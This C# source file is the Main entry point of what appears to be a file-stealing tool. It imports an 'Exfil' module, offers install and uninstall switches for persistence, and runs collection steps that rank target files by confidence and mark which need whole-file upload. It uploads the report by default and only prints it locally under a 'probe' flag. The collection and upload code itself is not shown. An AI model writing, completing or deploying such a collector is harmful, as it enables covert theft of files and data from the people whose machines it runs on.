using System.Diagnostics;
using Teste.Core;
using Teste.Exfil;

namespace Teste;

internal static class Program
{
    private static int Main(string[] args)
    {
        var f = args.Select(a => a.TrimStart('-').ToLowerInvariant()).ToHashSet();

        // instalacao antes de qualquer coleta: quem instala nao coleta
        if (f.Contains("uninstall")) return Installer.Uninstall();
        if (f.Contains("install")) return Installer.Install();

        Flags.Parse(args);
        var log = new Logger(f.Contains("debug") || f.Contains("i"));
        var r = Report.New();
        var all = Stopwatch.StartNew();

        foreach (var step in Steps.All(log))
        {
            var sw = Stopwatch.StartNew();
            try
            {
                step.Collect(r);
                log.Line($"[ok]   {step.Key,-8} {sw.ElapsedMilliseconds,6} ms");
            }
            catch (Exception ex)
            {
                r.Errors.Add(new ErrorRec(step.Key, $"{ex.GetType().Name}: {ex.Message}"));
                log.Line($"[fail] {step.Key,-8} {ex.GetType().Name}: {ex.Message}");
            }
        }

        r.Finish();
        r.ScanSeconds = Math.Round(all.Elapsed.TotalSeconds, 2);

        log.Line($"alvos={r.Targets.Count} alta={r.Targets.Count(t => t.Confidence == "alta")} " +
                 $"upload={r.Targets.Count(t => t.WholeFileNeeded)} bytes={r.Targets.Sum(t => t.Size):N0} " +
                 $"erros={r.Errors.Count}");

        if (f.Contains("probe")) Console.WriteLine(r.ToJson(true));   // imprime, nao envia
        else Uploader.Send(r, log);

        return 0;
    }
}